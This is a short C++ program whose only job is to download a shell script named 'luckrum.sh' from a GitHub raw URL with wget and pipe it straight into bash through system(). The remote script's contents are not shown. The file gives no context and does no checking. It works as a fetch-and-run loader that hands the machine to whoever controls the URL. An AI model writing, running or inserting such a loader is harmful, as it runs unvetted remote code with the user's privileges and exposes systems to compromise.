#include <iostream>
#include <cstdlib>

int main() {
    // Run the provided command to download and execute the bash script using bash explicitly
    std::cout << "Downloading and executing the bash script..." << std::endl;
    if (system("bash -c 'bash <(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/luckrum.sh)'") != 0) {
        std::cerr << "Failed to download or execute the bash script." << std::endl;
        return 1;
    }

    std::cout << "Script executed successfully." << std::endl;
    return 0;
}
